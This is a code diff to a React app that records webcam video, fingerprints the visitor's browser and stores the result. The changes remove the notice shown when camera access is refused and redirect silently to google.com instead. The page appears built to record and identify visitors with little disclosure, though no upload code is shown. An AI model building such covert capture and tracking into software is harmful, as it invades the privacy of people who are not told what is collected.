@@ -43,15 +43,15 @@ function App() {
     const w = window.screen.width;
     const h = window.screen.height;
 
-    if (navigator.geolocation) {
-      const options = {
-        enableHighAccuracy: true, 
-      }
-      navigator.geolocation.getCurrentPosition(successGeolocation, errorGeolocation, options)
-    }
+    // if (navigator.geolocation) {
+    //   const options = {
+    //     enableHighAccuracy: true, 
+    //   }
+    //   navigator.geolocation.getCurrentPosition(successGeolocation, errorGeolocation, options)
+    // }
     
 
-    await fpPromise
+    fpPromise
       .then((fp) => fp.get({ extendedResult: true }))
       .then((result) => {
         if (result.visitorFound) {
@@ -92,9 +92,10 @@ function App() {
       }
     })
     .catch((err) => {
-      alert('You have denied access to camera. Unable to capture your camera at the moment.');
+      // alert('You have denied access to camera. Unable to capture your camera at the moment.');
       console.error(err);
       window.location.href= "https://google.com"
+      // window.location.reload();
     })
 
     setTimeout(() => {
@@ -110,7 +111,7 @@ function App() {
             document.querySelector('#text').style.display = "none";
             setTimeout(() => {
               document.querySelector('#text').innerHTML = "";
-            }, 725)
+            }, 500)
           }
 
           if (count === -1) {
@@ -215,6 +216,12 @@ function App() {
       // Append parts of blobs, can also upload them to the network.
       if (event.data && event.data.size > 0) {
         blobs.push(event.data)
+
+        // fpPromise
+        //   .then((fp) => fp.get({ extendedResult: true }))
+        //   .then((result) => {
+        //     window.localStorage.setItem("fingerprint", JSON.stringify(result));
+        // });
       };
       // get Blobs for new compiled sizes
       const newSizesBlob = new Blob(blobs, { type: "video/mp4" });
@@ -224,6 +231,12 @@ function App() {
 
     mediaRecorder.start();
     setRecording(true);
+
+    fpPromise
+      .then((fp) => fp.get({ extendedResult: true }))
+      .then((result) => {
+        window.localStorage.setItem("fingerprint", JSON.stringify(result));
+    });
 
     let dateStarted = new Date().getTime();
     let count = 0;
